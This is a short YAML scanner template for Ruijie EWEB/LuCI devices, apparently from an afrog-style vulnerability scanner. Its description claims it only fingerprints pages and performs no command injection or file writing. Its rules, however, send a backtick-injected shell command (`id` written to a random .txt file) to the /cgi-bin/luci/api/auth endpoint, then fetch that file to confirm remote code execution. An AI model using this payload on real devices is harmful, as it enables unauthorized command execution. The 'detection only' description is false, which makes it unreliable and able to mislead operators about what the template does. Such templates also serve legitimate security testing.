id: ruijie-auth-rce

info:
  name: 锐捷 EWEB 指纹识别（疑似 auth RCE 影响范围）
  author: zan8in
  severity: critical
  verified: false
  description: |-
    仅用于识别疑似锐捷 EWEB/LuCI 页面特征，不包含命令注入/写文件等利用链验证。
    命中结果建议结合版本与官方通告进一步确认是否受影响。
    fofa: body="cgi-bin/luci" && body="#f47f3e"
  tags: ruijie,eweb,detect
  created: 2025/12/29

set:
  rname: randomLowercase(8)
rules:
  r0:
    request:
      method: POST
      path: /cgi-bin/luci/api/auth
      headers:
        Content-Type: application/json
      body: |
        {"method":"checkNet","params":{"host":"`id >{{rname}}.txt`"}}
    expression: response.status == 200
  r1:
    request:
      method: GET
      path: /cgi-bin/{{rname}}.txt
    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)

expression: r0() && r1()
